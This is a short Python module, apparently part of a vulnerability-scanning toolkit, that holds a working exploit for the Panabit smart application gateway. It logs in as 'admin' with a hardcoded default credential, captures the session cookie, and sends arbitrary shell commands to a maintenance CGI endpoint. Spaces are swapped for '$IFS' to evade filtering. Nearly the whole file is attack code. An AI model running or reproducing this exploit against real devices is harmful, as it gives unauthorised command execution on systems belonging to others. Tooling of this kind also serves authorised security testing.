# -*- coding:utf-8 -*-
# Panabit智能应用网关 弱密码
from ServiceScanModel.models import ServiceScan
from VulnScanModel.models import VulnScan
from .panabit_pwd_poc import POC
from ..requestClass import Requests, session

session = session()

class EXP:
    def __init__(self, vuln: VulnScan):
        self.vuln = vuln
        self.requestUtil = Requests(vuln.cookies)


    def login(self, url):
        resp = self.requestUtil.post(url + "/login/userverify.cgi",
                                data="action=user_login&palang=ch&username=admin&password=722289d072731e2cc73038aa9ad9e067", session=session)
        return (resp.headers["Set-Cookie"].split(";")[0])

    def rce(self, url, cmd):
        cmd = cmd.replace(" ", "$IFS")
        resp = self.requestUtil.get(url+f"/cgi-bin/Maintain/ajax_top?action=runcmd&cmd={cmd}", session=session)
        return resp.text


    def exp(self, cmd, content=""):
        poc = POC(ServiceScan(url=self.vuln.url, cookies=self.vuln.cookies))
        self.login(self.vuln.url)
        return self.rce(self.vuln.url, cmd)